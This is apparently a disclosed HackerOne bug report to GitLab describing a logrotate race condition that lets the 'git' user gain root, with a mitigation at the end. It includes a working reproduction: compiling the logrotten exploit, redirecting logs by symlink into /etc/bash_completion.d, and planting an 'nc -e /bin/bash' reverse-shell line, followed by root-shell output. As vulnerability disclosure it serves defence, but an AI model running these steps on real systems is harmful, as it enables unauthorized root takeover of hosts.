{
  "id": 578119,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NzgxMTk=",
  "url": "https://hackerone.com/reports/578119",
  "title": "Privilege escalation due to insecure use of logrotate",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2019-05-12T18:55:01.844Z",
  "submitted_at": "2019-05-12T18:55:01.844Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "petee",
    "url": "/petee",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ytvzmryeaJSC32gNXJqDA8DR/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-10-01T20:06:21.223Z",
  "bug_reporter_agreed_on_going_public_at": "2019-10-01T20:06:21.153Z",
  "team_member_agreed_on_going_public_at": "2019-10-01T09:42:42.025Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nGitlab sets the ownership of the logdirectory to the system-user \"git\", which might let local users obtain root access because of unsafe interaction with logrotate.\n\n### Steps to reproduce\n\nPlease note that the exploit is just a proof-of-concept. In order to win the race reliably the following requirements should met:\n\n* filesystem on bare disk. don't use lvm2 or overlayfs\n* don't use containers\n* stop auditd\n* stop tuned\n* don't use selinux or apparmor\n\n\nThe following steps were tested with gitlab-ce and gitlab-ee on Debian Stretch(amd64):\n\n1. ```apt-get install sudo git build-essential```\n2. ```sudo -u git /bin/bash```\n3. ```git clone https://github.com/whotwagner/logrotten.git /tmp/logrotten```\n4. ```cd /tmp/logrotten && gcc -o logrotten logrotten.c```\n5. ```echo \"hello gitlab\" > /var/log/gitlab/gitlab-workhorse/something.log```\n6. ```./logrotten -c /var/log/gitlab/gitlab-workhorse/something.log```\n7. ```echo \"if [ \\`id -u\\` -eq 0 ]; then (/bin/nc -e /bin/bash localhost 3333 &); fi\" > /etc/bash_completion.d/something.log.1.gz```\n8. ```nc -nvlp 3333```\n9. A root-shell connects to port 3333 as soon as user root logins(for example via ssh)\n\n### Impact\n\nA privilege escalation from system-user git to system-user root is possible(local root exploit).\n\n### Examples\n\nThe path of the logdirectory of gitlab can be manipulated by user git:\n```\n# logdir in gitlab-ee:\ndrwxr-xr-x 19 git root 4096 May 12 18:43 /var/log/gitlab/\n```\n\nLogfiles rotate once a day(or another frequency if configured) by logrotate as user root. Logrotates\nconfiguration looks like following:\n```\n# logrotate-config of gitlab-ee:\n/var/log/gitlab/gitlab-workhorse/*.log {\n  hourly\n\n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n\n  endscript\n}\n```\n\nDue to logrotate is prone to a race-condition it is possible for user \"git\" to replace the\ndirectory /var/log/gitlab/gitlab-workhorse/ with a symbolik link to any\ndirectory(for example /etc/bash_completion.d). Logrotate will place\nfiles AS ROOT into /etc/bash_completition.d and set the owner of the file to \"git\".\nAn attacker could simply place a reverse-shell into this file. As soon as root logs in, a reverse\nroot-shell will be executed.\n\nDetails of the race-condition can be found at:\n\n- [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)\n- [https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)\n- [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)\n\n\n### What is the current *bug* behavior?\n\nLogrotate will write into any directory with root privileges and change the owner of the created file. This could lead to privilege escalation.\n\n### What is the expected *correct* behavior?\n\nLogrotate must not have permissions to write into any directory.\n\n### Relevant logs and/or screenshots\n\n#### Exploitation\n\nProof of concept:\n```\ngit@Stretch64:~$ git clone https://github.com/whotwagner/logrotten.git /tmp/logrotten\nCloning into '/tmp/logrotten'...\nremote: Enumerating objects: 84, done.\nremote: Counting objects: 100% (84/84), done.\nremote: Compressing objects: 100% (58/58), done.\nremote: Total 84 (delta 35), reused 64 (delta 24), pack-reused 0\nUnpacking objects: 100% (84/84), done.\ngit@Stretch64:~$ cd /tmp/logrotten && gcc -o logrotten logrotten.c\ngit@Stretch64:/tmp/logrotten$ ./logrotten -c /var/log/gitlab/gitlab-workhorse/something.log\nWaiting for rotating /var/log/gitlab/gitlab-workhorse/something.log...\nRenamed /var/log/gitlab/gitlab-workhorse with /var/log/gitlab/gitlab-workhorse2 and created symlink to /etc/bash_completion.d\nDone!\ngit@Stretch64:/tmp/logrotten$ ls -l /etc/bash_completion.d/\ntotal 20\n-rw-r--r-- 1 root root   439 Sep 28  2018 git-prompt\n-rw-r--r-- 1 root root 11144 Oct 28  2018 grub\n-rw-r--r-- 1 git  git     33 May 12 18:44 something.log.1.gz\ngit@Stretch64:/tmp/logrotten$ echo  \"if [ \\`id -u\\` -eq 0 ]; then (/bin/nc -e /bin/bash localhost 3333 &); fi\" > /etc/bash_completion.d/something.log.1.gz\ngit@Stretch64:/tmp/logrotten$ nc -nvlp 3333\nlistening on [any] 3333 ...\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 55526\nid\nuid=0(root) gid=0(root) groups=0(root)\nls -la\ntotal 32\ndrwx------  4 root root 4096 May 12 18:47 .\ndrwxr-xr-x 22 root root 4096 Apr 25 18:31 ..\n-rw-------  1 root root 1405 May 12 19:59 .bash_history\n-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc\ndrwx------  3 root root 4096 May 12 18:47 .config\n-rw-r--r--  1 root root  148 Aug 17  2015 .profile\ndrwx------  2 root root 4096 Apr 25 18:40 .ssh\n-rw-------  1 root root 2194 May 12 17:29 .viminfo\n\n```\n\nPlease note that for this example the exploit writes into /etc/bash_completion.d which requires that root logs in. It might be possible to exploit this bug without interaction of user root by writing into /etc/cron.d or anything similar.\n\n### Output of checks\n\nThis bug was verified using the following installation methods:\n\n- Omnibus gitlab-ee\n- Omnibus gitlab-ce\n- Manual installation using the instructions from https://docs.gitlab.com/ee/install/installation.html\n\n#### Logrotate-configs and Logdir in gitlab-ee\n\n/var/opt/gitlab/logrotate/logrotate.d:\n```\n# Generated by gitlab-ctl reconfigure\n# Modifications will be overwritten!\n\n/var/log/gitlab/gitlab-pages/*.log {\n  hourly\n  \n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n    \n  endscript\n}\n# Generated by gitlab-ctl reconfigure\n# Modifications will be overwritten!\n\n/var/log/gitlab/gitlab-rails/*.log {\n  hourly\n  \n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n    \n  endscript\n}\n# Generated by gitlab-ctl reconfigure\n# Modifications will be overwritten!\n\n/var/log/gitlab/gitlab-shell//*.log {\n  hourly\n  \n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n    \n  endscript\n}\n# Generated by gitlab-ctl reconfigure\n# Modifications will be overwritten!\n\n/var/log/gitlab/gitlab-workhorse/*.log {\n  hourly\n  \n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n    \n  endscript\n}\n# Generated by gitlab-ctl reconfigure\n# Modifications will be overwritten!\n\n/var/log/gitlab/nginx/*.log {\n  hourly\n  \n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n    \n  endscript\n}\n# Generated by gitlab-ctl reconfigure\n# Modifications will be overwritten!\n\n/var/log/gitlab/unicorn/*.log {\n  hourly\n  \n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n    \n  endscript\n}\n\n```\n\nPermissions of the parent logdirectory:\n```\ndrwxr-xr-x 19 git root 4096 May 12 19:58 /var/log/gitlab/\n```\n\n#### Logrotate-configs and Logdir in gitlab-ce\n\n/var/opt/gitlab/logrotate/logrotate.d:\n```\n# Generated by gitlab-ctl reconfigure\n# Modifications will be overwritten!\n\n/var/log/gitlab/gitlab-pages/*.log {\n  hourly\n  \n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n    \n  endscript\n}\n# Generated by gitlab-ctl reconfigure\n# Modifications will be overwritten!\n\n/var/log/gitlab/gitlab-rails/*.log {\n  hourly\n  \n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n    \n  endscript\n}\n# Generated by gitlab-ctl reconfigure\n# Modifications will be overwritten!\n\n/var/log/gitlab/gitlab-shell//*.log {\n  hourly\n  \n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n    \n  endscript\n}\n# Generated by gitlab-ctl reconfigure\n# Modifications will be overwritten!\n\n/var/log/gitlab/gitlab-workhorse/*.log {\n  hourly\n  \n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n    \n  endscript\n}\n# Generated by gitlab-ctl reconfigure\n# Modifications will be overwritten!\n\n/var/log/gitlab/nginx/*.log {\n  hourly\n  \n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n    \n  endscript\n}\n# Generated by gitlab-ctl reconfigure\n# Modifications will be overwritten!\n\n/var/log/gitlab/unicorn/*.log {\n  hourly\n  \n  rotate 30\n  compress\n  copytruncate\n  missingok\n  postrotate\n    \n  endscript\n}\n```\n\nPermissions of the parent logdirectory:\n```\ndrwxr-xr-x 19 git root 4096 May 10 23:39 /var/log/gitlab/\n```\n\n#### Logrotate-configs and Logdir in gitlab manually installed\n\nThe following configuration is taken from the installation-instructions that can be found at [https://docs.gitlab.com/ee/install/installation.html](https://docs.gitlab.com/ee/install/installation.html).\n\n[/etc/logrotate.d/gitlab](https://docs.gitlab.com/ee/install/installation.html#set-up-logrotate):\n```\n/home/git/gitlab/log/*.log {\n    daily\n    missingok\n    rotate 90\n    compress\n    notifempty\n    copytruncate\n}\n\n/home/git/gitlab-shell/gitlab-shell.log {\n    daily\n    missingok\n    rotate 90\n    compress\n    notifempty\n    copytruncate\n}\n```\n\n[Logdir is located in /home/git/gitlab and is configured with user \"git\"](https://docs.gitlab.com/ee/install/installation.html#clone-the-source):\n```\nsudo -u git -H git clone https://gitlab.com/gitlab-org/gitlab-ce.git -b X-Y-stable gitlab\n```\n\n\n#### Results of GitLab environment info\n\n#### gitlab-ee\n\n```\ngitlab-rake gitlab:env:info\n\nSystem information\nSystem:         Debian 9.9\nProxy:          no\nCurrent User:   git\nUsing RVM:      no\nRuby Version:   2.5.3p105\nGem Version:    2.7.6\nBundler Version:1.17.3\nRake Version:   12.3.2\nRedis Version:  3.2.12\nGit Version:    2.18.1\nSidekiq Version:5.2.5\nGo Version:     unknown\n\nGitLab information\nVersion:        11.10.4-ee\nRevision:       88a3c791734\nDirectory:      /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:     PostgreSQL\nDB Version:     9.6.11\nURL:            https://gitlab.example.com\nHTTP Clone URL: https://gitlab.example.com/some-group/some-project.git\nSSH Clone URL:  git@gitlab.example.com:some-group/some-project.git\nElasticsearch:  no\nGeo:            no\nUsing LDAP:     no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:        9.0.0\nRepository storage paths:\n- default:      /var/opt/gitlab/git-data/repositories\nGitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell\nGit:            /opt/gitlab/embedded/bin/git\n```\n\n\n#### gitlab-ce\n```\nSystem information\nSystem:\t\tDebian 9.8\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.5.3p105\nGem Version:\t2.7.6\nBundler Version:1.17.3\nRake Version:\t12.3.2\nRedis Version:\t3.2.12\nGit Version:\t2.18.1\nSidekiq Version:5.2.5\nGo Version:\tunknown\n\nGitLab information\nVersion:\t11.10.4\nRevision:\t62c464651d2\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t9.6.11\nURL:\t\thttp://gitlab.example.com\nHTTP Clone URL:\thttp://gitlab.example.com/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab.example.com:some-group/some-project.git\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers: \n\nGitLab Shell\nVersion:\t9.0.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n### Mitigation\n\nChange the owner and group of /var/log/gitlab to root or use the \"su\"-directive in the logrotate configuration file.\n\n## Impact\n\nA privilege escalation from local system-user git to system-user root is possible(local root exploit).",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 29,
  "voters": [
    "ali",
    "dhakal_ananda",
    "mik317",
    "protesen",
    "naategh",
    "cr4xerbik4sh",
    "silv3rpoision",
    "cryptographer",
    "witchking_h1",
    "pix",
    "and 19 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
